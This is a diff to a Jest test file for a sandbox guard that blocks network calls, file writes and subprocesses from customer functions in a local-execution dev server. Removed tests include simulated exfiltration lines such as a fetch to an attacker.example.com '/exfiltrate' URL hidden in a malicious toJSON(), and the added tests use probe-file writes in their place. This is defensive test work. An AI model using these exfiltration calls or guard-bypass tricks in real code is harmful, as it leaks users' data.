@@ -4,8 +4,12 @@
 
 /* global globalThis, NodeJS */
 
+import { rmSync } from '@dd/core/helpers/fs';
 import type { Logger } from '@dd/core/types';
 import { mockLogFn, mockLogger, moduleResolverFor } from '@dd/tests/_jest/helpers/mocks';
+import fs from 'fs';
+import os from 'os';
+import path from 'path';
 
 import * as shared from '../backend/shared';
 import type { BackendFunction } from '../backend/types';
@@ -24,7 +28,8 @@ import {
     deriveActionTimeouts,
     executeScriptLocally as executeScriptLocallyWithRuntimeContext,
 } from './local-execution';
-import { FOREIGN_GUARD_MESSAGE, forceReset } from './network-guard';
+import { makeProbeDirOutsideTmp } from './network-guard.fixtures';
+import { ALREADY_GUARDED, FOREIGN_GUARD_MESSAGE, FS_WRITE_BLOCKED_MESSAGE } from './network-guard';
 
 const funcWithConnection: BackendFunction = { ...func, allowedConnectionIds: ['conn-1'] };
 
@@ -75,9 +80,13 @@ function executeScriptLocally(
     );
 }
 
-// The guard's patches are process-wide, so a test left in a blocked scope would leak into later ones.
-afterEach(() => {
-    forceReset();
+// Per-run directory, so leftover probe files from a regressed guard can't collide across runs or workers.
+let probeDir: string;
+beforeAll(() => {
+    probeDir = makeProbeDirOutsideTmp('dd-local-execution-probes-');
+});
+afterAll(() => {
+    rmSync(probeDir);
 });
 
 /** A `loadModule` double that resolves the customer's function from a map and rejects anything else with a module-not-found error, matching the common case where neither optional package is installed. */
@@ -86,24 +95,6 @@ function loadModuleReturning(exports: Record<string, unknown>): LoadModule {
 }
 
 const ORDER_MARKER = '__ddLocalExecutionTestOrder';
-
-// `(globalThis as { fetch: typeof fetch }).fetch = impl` repeated verbatim at every mock/restore
-// call site — this collapses the cast to one place.
-function setGlobalFetch(impl: typeof fetch): void {
-    (globalThis as { fetch: typeof fetch }).fetch = impl;
-}
-
-// `getNetworkGuard()`'s lazy `import('./network-guard')` (see local-execution.ts) defers
-// network-guard.ts's module-load-time side effects (process-wide monkeypatches on net.Socket,
-// fetch, dgram, dns, child_process, worker_threads.Worker) until local execution actually runs,
-// instead of installing them the moment any bundler transitively imports this file via index.ts.
-// Not unit-testable under Jest: ts-jest doesn't route TypeScript-compiled modules through Node's
-// native `require.cache`, so inspecting it can't distinguish an eagerly- from a lazily-loaded
-// module here. Verified instead by bundling this file with esbuild (matching what a real
-// non-Vite consumer of the apps plugin actually does) and confirming the compiled output wraps
-// `getNetworkGuard`'s call in `Promise.resolve().then(() => init_network_guard())` — esbuild's
-// standard lazy-CJS-module pattern — rather than requiring network-guard.ts eagerly at the top
-// of the bundle.
 
 describe('local-execution — executeScriptLocally', () => {
     test('Should run a simple function in-process and return its result', async () => {
@@ -473,10 +464,8 @@ describe('local-execution — executeScriptLocally', () => {
         ).rejects.toThrow(/must have an inputs field/);
     });
 
-    // assertConnectionIdAllowed only checks this call's own top-level connectionId — a call with no
-    // connectionId (allowed regardless of allowedConnectionIds, per the test above) that nests its
-    // own allowedConnectionIds inside inputs would otherwise reach the destination with a
-    // self-declared scope nothing here validated.
+    // A call with no connectionId skips assertConnectionIdAllowed, so a scope nested in its inputs
+    // would otherwise reach the destination unvalidated.
     test('Should reject an action call that declares its own allowedConnectionIds inside inputs', async () => {
         const executeAction = jest.fn().mockResolvedValue({ ok: true });
         await expect(
@@ -971,7 +960,8 @@ describe('local-execution — executeScriptLocally', () => {
     });
 
     test("Should keep a hung function's own late continuation blocked after timeout, while a fresh execution afterward still works normally", async () => {
-        let lateNetworkAttempt: Promise<unknown> | undefined;
+        const probePath = path.join(probeDir, 'late.txt');
+        let lateWriteAttempt: Promise<unknown> | undefined;
 
         await expect(
             executeScriptLocally(
@@ -985,8 +975,8 @@ describe('local-execution — executeScriptLocally', () => {
                             // Scheduled, not awaited, so `example` never settles and the race
                             // below times out normally — fires after that 50ms timeout, not before.
                             setTimeout(() => {
-                                lateNetworkAttempt = fetch('https://example.com');
-                                lateNetworkAttempt.catch(() => undefined);
+                                lateWriteAttempt = fs.promises.writeFile(probePath, 'data');
+                                lateWriteAttempt.catch(() => undefined);
                             }, 100);
                         }),
                 }),
@@ -999,13 +989,13 @@ describe('local-execution — executeScriptLocally', () => {
         await new Promise((resolve) => setTimeout(resolve, 100));
 
         // The abandoned continuation's own async chain stays permanently blocked (by design), so
-        // its late network attempt must still be rejected — an identity check on the guarded
+        // its late write attempt must still be rejected — an identity check on the guarded
         // property can't verify this, since the wrapper never changes identity either way.
-        expect(lateNetworkAttempt).toBeDefined();
-        await expect(lateNetworkAttempt).rejects.toThrow(/Network access is not allowed/);
+        expect(lateWriteAttempt).toBeDefined();
+        await expect(lateWriteAttempt).rejects.toThrow(FS_WRITE_BLOCKED_MESSAGE);
 
         // A fresh execution afterward must still work normally — the abandoned scope above must
-        // not permanently wedge network/action access for everything that runs after it.
+        // not permanently wedge fs/action access for everything that runs after it.
         const result = await executeScriptLocally(
             func,
             TEST_PROJECT_ROOT,
@@ -1688,17 +1678,18 @@ describe('local-execution — executeScriptLocally', () => {
 
         // Mirrors the raw $.Actions path's malicious-toJSON() test: the action-catalog typed-wrapper
         // path doesn't share code with makeActionsProxy, so it needs the same coverage separately.
-        test("Should block a malicious toJSON() on an action-catalog typed-wrapper call's request from making a real network call under cover of the exemption", async () => {
+        test("Should block a malicious toJSON() on an action-catalog typed-wrapper call's request from making a real fs write", async () => {
             jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
             let registeredImpl:
                 | ((actionId: string, request: unknown) => Promise<unknown>)
                 | undefined;
-            let fetchAttempt: Promise<unknown> | undefined;
+            const probePath = path.join(probeDir, 'toJSON-catalog.txt');
+            let writeAttempt: Promise<unknown> | undefined;
             const maliciousRequest = {
                 inputs: {
                     text: 'hi',
                     toJSON() {
-                        fetchAttempt = fetch('https://attacker.example.com/exfiltrate');
+                        writeAttempt = fs.promises.writeFile(probePath, 'exfiltrated');
                         return { text: 'hi' };
                     },
                 },
@@ -1739,8 +1730,8 @@ describe('local-execution — executeScriptLocally', () => {
             );
 
             expect(result).toEqual({ data: { data: null, stub: true, fqn: expect.any(String) } });
-            expect(fetchAttempt).toBeDefined();
-            await expect(fetchAttempt).rejects.toThrow(/Network access is not allowed/);
+            expect(writeAttempt).toBeDefined();
+            await expect(writeAttempt).rejects.toThrow(FS_WRITE_BLOCKED_MESSAGE);
         });
 
         // Mirrors the action-catalog abandonment test — apps-backend's setBackend has the same shared-module-level-setter hazard.
@@ -2181,8 +2172,9 @@ describe('local-execution — executeScriptLocally', () => {
         });
     });
 
-    describe('network/subprocess guard', () => {
-        test('Should reject when the customer function tries a raw net.Socket connection', async () => {
+    describe('fs write/subprocess guard', () => {
+        test('Should reject when the customer function tries a raw fs write', async () => {
+            const probePath = path.join(probeDir, 'raw-write.txt');
             await expect(
                 executeScriptLocally(
                     func,
@@ -2192,26 +2184,13 @@ describe('local-execution — executeScriptLocally', () => {
                     loadModuleReturning({
                         example: () => {
                             // eslint-disable-next-line @typescript-eslint/no-require-imports
-                            const net = require('net');
-                            return new net.Socket().connect(80, 'example.com');
+                            const rawFs = require('fs');
+                            return rawFs.promises.writeFile(probePath, 'data');
                         },
                     }),
                     mockLogger,
                 ),
-            ).rejects.toThrow(/Network access is not allowed/);
-        });
-
-        test('Should reject when the customer function tries a raw fetch() call', async () => {
-            await expect(
-                executeScriptLocally(
-                    func,
-                    TEST_PROJECT_ROOT,
-                    [],
-                    stubExecuteAction,
-                    loadModuleReturning({ example: () => fetch('https://example.com') }),
-                    mockLogger,
-                ),
-            ).rejects.toThrow(/Network access is not allowed/);
+            ).rejects.toThrow(FS_WRITE_BLOCKED_MESSAGE);
         });
 
         test('Should reject when the customer function tries to spawn a subprocess', async () => {
@@ -2233,7 +2212,8 @@ describe('local-execution — executeScriptLocally', () => {
             ).rejects.toThrow(/Spawning a subprocess is not allowed/);
         });
 
-        test('Should still let a real $.Actions call through while the rest of the function is network-blocked', async () => {
+        test('Should still let a real $.Actions call through while the rest of the function is blocked', async () => {
+            const probePath = path.join(probeDir, 'after-action.txt');
             const executeAction = jest.fn().mockResolvedValue({ ok: true });
             const result = await executeScriptLocally(
                 func,
@@ -2245,10 +2225,9 @@ describe('local-execution — executeScriptLocally', () => {
                         const actionResult = await testDollar().Actions.slack.chat.postMessage({
                             inputs: { text: 'hi' },
                         });
-                        // A raw fetch right after the sanctioned $.Actions call must still be blocked — the exemption is scoped to that one call.
-                        await expect(fetch('https://example.com')).rejects.toThrow(
-                            /Network access is not allowed/,
-                        );
+                        // A write right after a $.Actions call must still be blocked.
+                        const blockedWrite = fs.promises.writeFile(probePath, 'data');
+                        await expect(blockedWrite).rejects.toThrow(FS_WRITE_BLOCKED_MESSAGE);
                         return actionResult;
                     },
                 }),
@@ -2262,14 +2241,116 @@ describe('local-execution — executeScriptLocally', () => {
             );
         });
 
-        test('Should block a malicious toJSON() on $.Actions inputs from making a real network call under cover of the exemption', async () => {
-            // toJSON() must be synchronous, so its fetch attempt can't be awaited there — capture the outcome and assert once the whole execution settles.
-            let fetchAttempt: Promise<unknown> | undefined;
+        test('Should refuse path writes from an execution abandoned by its timeout', async () => {
+            const workPrefix = path.join(os.tmpdir(), 'dd-local-execution-abandoned-');
+            const workDir = fs.mkdtempSync(workPrefix);
+            const lateFile = path.join(workDir, 'late.txt');
+            let lateWriteError: unknown;
+            let lateWriteDone: (() => void) | undefined;
+            const lateWriteFinished = new Promise<void>((resolve) => {
+                lateWriteDone = resolve;
+            });
+            const loadModule = loadModuleReturning({
+                example: async () => {
+                    setTimeout(() => {
+                        try {
+                            fs.writeFileSync(lateFile, 'data');
+                        } catch (err) {
+                            lateWriteError = err;
+                        }
+                        lateWriteDone?.();
+                    }, 60);
+                    await new Promise<never>(() => {});
+                },
+            });
+            try {
+                const abandoned = executeScriptLocally(
+                    func,
+                    TEST_PROJECT_ROOT,
+                    [],
+                    stubExecuteAction,
+                    loadModule,
+                    mockLogger,
+                    20,
+                );
+
+                await expect(abandoned).rejects.toThrow(/timed out after 20ms/);
+                await lateWriteFinished;
+                const written = fs.existsSync(lateFile);
+
+                expect(lateWriteError).toMatchObject({ message: FS_WRITE_BLOCKED_MESSAGE });
+                expect(written).toBe(false);
+            } finally {
+                rmSync(workDir);
+            }
+        });
+
+        test('Should let the function write and read a file under os.tmpdir()', async () => {
+            const tmpFile = path.join(
+                os.tmpdir(),
+                `dd-local-execution-${process.pid}-${Date.now()}.json`,
+            );
+            const loadModule = loadModuleReturning({
+                example: async () => {
+                    await fs.promises.writeFile(tmpFile, '{"cached":true}');
+                    return fs.promises.readFile(tmpFile, 'utf8');
+                },
+            });
+            try {
+                const result = await executeScriptLocally(
+                    func,
+                    TEST_PROJECT_ROOT,
+                    [],
+                    stubExecuteAction,
+                    loadModule,
+                    mockLogger,
+                );
+
+                expect(result).toEqual({ data: '{"cached":true}' });
+            } finally {
+                rmSync(tmpFile);
+            }
+        });
+
+        // The dispatch reaches code the customer can replace, like globalThis.fetch.
+        test("Should keep the $.Actions dispatch inside the function's blocked scope", async () => {
+            const dispatchWritePath = path.join(probeDir, 'dispatch-write.txt');
+            let dispatchWriteError: unknown;
+            const executeAction: ExecuteAction = async () => {
+                try {
+                    fs.writeFileSync(dispatchWritePath, 'cached');
+                } catch (err) {
+                    dispatchWriteError = err;
+                }
+                return { ok: true };
+            };
+            const loadModule = loadModuleReturning({
+                example: () =>
+                    testDollar().Actions.slack.chat.postMessage({ inputs: { text: 'hi' } }),
+            });
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                executeAction,
+                loadModule,
+                mockLogger,
+            );
+            const dispatchWritten = fs.existsSync(dispatchWritePath);
+
+            expect(result).toEqual({ data: { ok: true } });
+            expect(dispatchWriteError).toMatchObject({ message: FS_WRITE_BLOCKED_MESSAGE });
+            expect(dispatchWritten).toBe(false);
+        });
+
+        test('Should block a malicious toJSON() on $.Actions inputs from making a real fs write', async () => {
+            // toJSON() must be synchronous, so its write attempt can't be awaited there — capture the outcome and assert once the whole execution settles.
+            const probePath = path.join(probeDir, 'toJSON.txt');
+            let writeAttempt: Promise<unknown> | undefined;
             const maliciousInputs = {
                 text: 'hi',
                 toJSON() {
-                    // Would resolve instead of rejecting if this ran inside runAllowed's window, meant only for the trusted preview-async call itself.
-                    fetchAttempt = fetch('https://attacker.example.com/exfiltrate');
+                    writeAttempt = fs.promises.writeFile(probePath, 'exfiltrated');
                     return { text: 'hi' };
                 },
             };
@@ -2289,12 +2370,11 @@ describe('local-execution — executeScriptLocally', () => {
             );
 
             expect(result).toEqual({ data: { data: null, stub: true, fqn: expect.any(String) } });
-            expect(fetchAttempt).toBeDefined();
-            await expect(fetchAttempt).rejects.toThrow(/Network access is not allowed/);
+            expect(writeAttempt).toBeDefined();
+            await expect(writeAttempt).rejects.toThrow(FS_WRITE_BLOCKED_MESSAGE);
         });
 
-        test('Should restore real network access after execution, for whatever the dev server itself does next', async () => {
-            const realFetch = globalThis.fetch;
+        test('Should restore fs write access after execution, for whatever the dev server itself does next', async () => {
             await executeScriptLocally(
                 func,
                 TEST_PROJECT_ROOT,
@@ -2303,130 +2383,22 @@ describe('local-execution — executeScriptLocally', () => {
                 loadModuleReturning({ example: () => 'fine' }),
                 mockLogger,
             );
-            expect(globalThis.fetch).toBe(realFetch);
+            const afterPath = path.join(probeDir, 'after.txt');
+            fs.writeFileSync(afterPath, 'written');
+            const content = fs.readFileSync(afterPath, 'utf8');
+            expect(content).toBe('written');
         });
 
-        test('Should keep network access allowed through two real, overlapping $.Actions calls made concurrently via Promise.all, without either blocking the other mid-flight', async () => {
-            // Proves the exemption holds through the real customer path (Promise.all → makeActionsProxy → runAllowed), not just at the unit level.
-            const order: string[] = [];
-            const executeAction: ExecuteAction = async (fqn) => {
-                const label = fqn.includes('slow') ? 'slow' : 'fast';
-                order.push(`${label}-start`);
-                if (label === 'slow') {
-                    await new Promise((r) => setTimeout(r, 20));
-                }
-                await fetch(`https://example.com/${label}`);
-                order.push(`${label}-end`);
-                return { ok: true, fqn };
-            };
-
-            const originalFetch = globalThis.fetch;
-            const fetchMock = jest.fn().mockResolvedValue('ok');
-            setGlobalFetch(fetchMock as unknown as typeof fetch);
-
-            let result: { data: unknown };
-            try {
-                result = await executeScriptLocally(
-                    func,
-                    TEST_PROJECT_ROOT,
-                    [],
-                    executeAction,
-                    loadModuleReturning({
-                        example: () => {
-                            const $ = testDollar();
-                            return Promise.all([
-                                $.Actions.slow.action({ inputs: {} }),
-                                $.Actions.fast.action({ inputs: {} }),
-                            ]);
-                        },
-                    }),
-                    mockLogger,
-                );
-            } finally {
-                setGlobalFetch(originalFetch);
-            }
-
-            expect(result.data).toEqual([
-                { ok: true, fqn: 'com.datadoghq.slow.action' },
-                { ok: true, fqn: 'com.datadoghq.fast.action' },
-            ]);
-            // The slow call's own fetch, made after the fast call's allow scope exited, must still resolve — network stayed allowed for it the whole time.
-            expect(order).toEqual(['slow-start', 'fast-start', 'fast-end', 'slow-end']);
-            expect(fetchMock).toHaveBeenCalledWith('https://example.com/slow');
-            expect(fetchMock).toHaveBeenCalledWith('https://example.com/fast');
-        });
-
-        // The action-catalog callback must be exempted from the block like makeActionsProxy's apply trap — it runs from inside the blocked function.
-        test("Should let a real network call through an action-catalog typed-wrapper call, not block it as if it were the customer's own code", async () => {
+        // Adapter resolution goes through Vite's own module loader, which can write caches.
+        test("Should not block fs writes while loading the action-catalog adapter, since that's Vite's own module resolution, not customer code", async () => {
             jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
-            const executeAction: ExecuteAction = async (fqn, inputs) => {
-                const response = await fetch('https://example.com/action-catalog');
-                return { fqn, inputs, response };
-            };
-
-            let registeredImpl:
-                | ((actionId: string, request: unknown) => Promise<unknown>)
-                | undefined;
-            const loadModule: LoadModule = async (specifier: string) => {
-                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
-                    return {
-                        example: async () =>
-                            registeredImpl?.('com.datadoghq.slack.chat.postMessage', {
-                                inputs: { text: 'hi' },
-                            }),
-                    };
-                }
-                if (specifier === '@datadog/action-catalog/action-execution') {
-                    return {
-                        setExecuteActionImplementation: (
-                            impl: (actionId: string, request: unknown) => Promise<unknown>,
-                        ) => {
-                            registeredImpl = impl;
-                        },
-                    };
-                }
-                const notFoundError: NodeJS.ErrnoException = new Error(
-                    `Cannot find module '${specifier}'`,
-                );
-                notFoundError.code = 'MODULE_NOT_FOUND';
-                throw notFoundError;
-            };
-
-            const originalFetch = globalThis.fetch;
-            const fetchMock = jest.fn().mockResolvedValue('ok');
-            setGlobalFetch(fetchMock as unknown as typeof fetch);
-
-            let result: { data: unknown };
-            try {
-                result = await executeScriptLocally(
-                    func,
-                    TEST_PROJECT_ROOT,
-                    [],
-                    executeAction,
-                    loadModule,
-                    mockLogger,
-                );
-            } finally {
-                setGlobalFetch(originalFetch);
-            }
-
-            expect(result.data).toEqual({
-                fqn: 'com.datadoghq.slack.chat.postMessage',
-                inputs: { text: 'hi' },
-                response: 'ok',
-            });
-            expect(fetchMock).toHaveBeenCalledWith('https://example.com/action-catalog');
-        });
-
-        // Adapter resolution goes through Vite's own module loader, which can fetch or write caches.
-        test("Should not block the network while loading the action-catalog adapter, since that's Vite's own module resolution, not customer code", async () => {
-            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
+            const cachePath = path.join(probeDir, 'vite-dep-cache.json');
             const loadModule: LoadModule = async (specifier: string) => {
                 if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
                     return { example: () => 'fine' };
                 }
                 if (specifier === '@datadog/action-catalog/action-execution') {
-                    await fetch('https://example.com/vite-dep-optimizer');
+                    await fs.promises.writeFile(cachePath, '{}');
                     return { setExecuteActionImplementation: () => {} };
                 }
                 const notFoundError: NodeJS.ErrnoException = new Error(
@@ -2436,31 +2408,18 @@ describe('local-execution — executeScriptLocally', () => {
                 throw notFoundError;
             };
 
-            const originalFetch = globalThis.fetch;
-            const fetchedUrls: string[] = [];
-            const fakeFetch: typeof fetch = async (input) => {
-                const url = String(input);
-                fetchedUrls.push(url);
-                return new Response('ok');
-            };
-            setGlobalFetch(fakeFetch);
-
-            let result: { data: unknown };
-            try {
-                result = await executeScriptLocally(
-                    func,
-                    TEST_PROJECT_ROOT,
-                    [],
-                    stubExecuteAction,
-                    loadModule,
-                    mockLogger,
-                );
-            } finally {
-                setGlobalFetch(originalFetch);
-            }
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModule,
+                mockLogger,
+            );
+            const cacheWritten = fs.existsSync(cachePath);
 
             expect(result).toEqual({ data: 'fine' });
-            expect(fetchedUrls).toEqual(['https://example.com/vite-dep-optimizer']);
+            expect(cacheWritten).toBe(true);
         });
 
         test('Should not load the adapter packages for an execution already abandoned while its own module was still loading', async () => {
@@ -2501,28 +2460,20 @@ describe('local-execution — executeScriptLocally', () => {
     });
 
     describe('loadCustomerModuleEntry', () => {
-        // Regression test: network-guard.ts's trustedStdout/trustedStderr are captured at that
-        // module's own load time (see network-guard.ts). If the customer module's top-level code
-        // ran first, it could repoint process.stdout before the guard ever captures it, permanently
-        // defeating the write-blocking exemption check for every later execution in the process.
-        // loadCustomerModuleEntry is the one choke point every caller (executeColdActionLocally's
-        // priming, runScriptLocally's own fallback) funnels through, so asserting order here covers
-        // every path. Isolates both modules fresh so the assertion isn't satisfied by network-guard
-        // already having loaded from an earlier test in this file.
-        test("Should await the network guard module before evaluating the customer module's top-level code", async () => {
+        // The guards must be installed before customer top-level code runs, or it could keep raw
+        // fs/child_process references. Isolated modules keep an earlier test's install from satisfying it.
+        test("Should install the guards before evaluating the customer module's top-level code", async () => {
             const calls: string[] = [];
 
             await jest
                 .isolateModulesAsync(async () => {
-                    jest.doMock('./network-guard', () => {
-                        calls.push('network-guard-loaded');
-                        return {
-                            assertNoForeignGuard: () => undefined,
-                            runBlocked: async (fn: () => Promise<unknown>) => fn(),
-                            runAllowed: async (fn: () => Promise<unknown>) => fn(),
-                            forceReset: () => undefined,
-                        };
-                    });
+                    jest.doMock('./network-guard', () => ({
+                        assertNoForeignGuard: () => undefined,
+                        installGuards: () => {
+                            calls.push('guards-installed');
+                        },
+                        runBlocked: async (fn: () => Promise<unknown>) => fn(),
+                    }));
 
                     const {
                         loadCustomerModuleEntry: isolatedLoadCustomerModuleEntry,
@@ -2543,33 +2494,34 @@ describe('local-execution — executeScriptLocally', () => {
                     jest.dontMock('./network-guard');
                 });
 
-            expect(calls).toEqual(['network-guard-loaded', 'customer-module-loaded']);
+            expect(calls).toEqual(['guards-installed', 'customer-module-loaded']);
         });
 
         test("Should refuse before evaluating the customer module when another release's guard is installed", async () => {
             const loadModule = jest.fn<ReturnType<LoadModule>, Parameters<LoadModule>>();
-            const foreignGuardError = new Error(FOREIGN_GUARD_MESSAGE);
 
-            await jest
-                .isolateModulesAsync(async () => {
-                    jest.doMock('./network-guard', () => ({
-                        assertNoForeignGuard: () => {
-                            throw foreignGuardError;
-                        },
-                    }));
-                    const {
-                        loadCustomerModuleEntry: isolatedLoadCustomerModuleEntry,
-                    } = require('./local-execution');
+            await jest.isolateModulesAsync(async () => {
+                const isolatedGuard: typeof import('./network-guard') = require('./network-guard');
+                const foreignGetter = () => () => 'real';
+                Object.defineProperty(foreignGetter, ALREADY_GUARDED, { value: true });
+                const target = {};
+                Object.defineProperty(target, 'value', { get: foreignGetter, configurable: true });
+                isolatedGuard.installGuardedProperty(
+                    target,
+                    'value',
+                    (getReal: () => unknown) => getReal,
+                );
+                const {
+                    loadCustomerModuleEntry: isolatedLoadCustomerModuleEntry,
+                } = require('./local-execution');
 
-                    const entry = isolatedLoadCustomerModuleEntry(
-                        loadModule,
-                        func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX,
-                    );
-                    await expect(entry).rejects.toThrow(FOREIGN_GUARD_MESSAGE);
-                })
-                .finally(() => {
-                    jest.dontMock('./network-guard');
-                });
+                const loading = isolatedLoadCustomerModuleEntry(
+                    loadModule,
+                    func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX,
+                );
+
+                await expect(loading).rejects.toThrow(FOREIGN_GUARD_MESSAGE);
+            });
 
             expect(loadModule).not.toHaveBeenCalled();
         });
@@ -3240,7 +3192,7 @@ describe('local-execution — executeScriptLocally', () => {
         });
 
         // An abandoned execution's loadModule can resolve late, after a newer one is already inside the guards — it must not corrupt the newer state.
-        test("Should never let an abandoned execution's late-resolving loadModule enter the network guard while a newer execution is still inside them", async () => {
+        test("Should never let an abandoned execution's late-resolving loadModule enter the guards while a newer execution is still inside them", async () => {
             const makeLoadModule = (mainDelayMs: number): LoadModule => {
                 return async (specifier: string) => {
                     if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
